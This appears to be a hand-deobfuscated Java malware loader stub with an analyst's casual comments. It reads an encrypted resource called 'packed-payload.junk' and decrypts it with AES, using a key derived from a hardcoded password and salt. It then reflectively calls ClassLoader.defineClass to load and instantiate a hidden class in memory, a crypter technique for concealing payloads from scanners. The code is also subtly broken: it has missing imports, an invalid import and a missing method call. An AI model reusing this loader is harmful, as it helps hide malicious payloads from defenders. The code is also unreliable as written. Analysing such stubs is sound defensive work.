import java.io.DataInputStream;
import java.io.InputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.security.Key;
import java.security.ProtectionDomain;
import java.security.SecureClassLoader;
import java.security.spec.KeySpec;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

import Dummy;
import Remember;

public class Main {
	public static byte[] byteArray;
	public static SecretKeySpec secretKeySpecification;
	public static Cipher cipherInstance;
	public static Method cipherInit;
	public static Method defClass;

	public static void main(final String[] array) throws Exception {
		byteArray = new byte[4784];
		readResource();
		secretKeySetup();
		cipherSetup();
		initializeCrypto();
		uncoverMethod();
		Class hiddenClass = (Class)getHiddenClass();
		hiddenClass.newInstance();
	}

	public static void readResource() throws IOException {
		Class dummyClass = Dummy.class;//see class
		URL resourceLocation = dummyClass.getResource("/packed-payload.junk");
		InputStream resourceStream = resourceLocation.openStream();
		Remember.rsrcData = new DataInputStream(resourceStream);
		Remember.rsrcData.readFully(byteArray);
	}

	public static void secretKeySetup() throws NoSuchAlgorithmException, InvalidKeySpecException {
		char[] password = { 'b', 'Y', '6', 'b', 'V', 'E', 'N', '3', 'V', 'j', 'c', 'P', 'd', 'j', 'E', 'i' };
		byte[] salt = { 98, 107, 90, 112, 116, 66, 99, 108, 67, 103, 78, 117, 111, 121, 81, 113 };
		PBEKeySpec pbeSpecification = new PBEKeySpec(password, salt, 10000, 128);//PBE means password-based encryption
		SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
		SecretKey key = keyFactory.generateSecret(pbeSpecification);
		byte[] keyBytes = key.getEncoded();
		secretKeySpecification = new SecretKeySpec(keyBytes, "AES");
	}

	public static void cipherSetup() throws NoSuchMethodException, NoSuchPaddingException, NoSuchAlgorithmException {//I made this method static
		cipherInstance = Cipher.getInstance("AES/ECB/PKCS5Padding");
		Class cipherClass = cipherInstance.getClass();
		Class[] holder = new Class[] { Integer.TYPE, Key.class };//Integer.TYPE is... almost and Integer it's weird
		cipherInit = cipherClass.getDeclaredMethod("init", (Class[])holder);
	}

	public static void initializeCrypto() throws IllegalAccessException, InvocationTargetException {
		Integer integerObj = 2;//also used as Object
		Object secretKeyObj = secretKeySpecification;
		Object[] objArray = new Object[] { integerObj, secretKeyObj };
		cipherInit.invoke(cipherInstance, objArray);
	}

	public static void uncoverMethod() throws NoSuchMethodException {//I made this method static
		Class[] classArray = new Class[] { String.class, byte[].class, Integer.TYPE, Integer.TYPE, ProtectionDomain.class };
		Class cLoadInstance = ClassLoader.class;
		defClass = cLoadInstance.getDeclaredMethod("defineClass", (Class[])classArray);
		defClass.setAccessible(true);//only time any bool ever actually used, lol
	}

	public static Class getHiddenClass() throws IllegalAccessException, InvocationTargetException, BadPaddingException, IllegalBlockSizeException {
		Remember.selfRef = Remember.class;//freaky self-recursion (sorta), see class
		ClassLoader loader = new SecureClassLoader(Remember.selfRef.getClassLoader()) {};
		Object[] arguments = new Object[] { "q0b4.bootstrap.templates.Header", cipherInstance.doFinal(byteArray), 0, 4772, Remember.selfRef.getProtectionDomain };//name, class data, offset, length, Protection Domain
		return defClass.invoke(loader, arguments);
	}
}
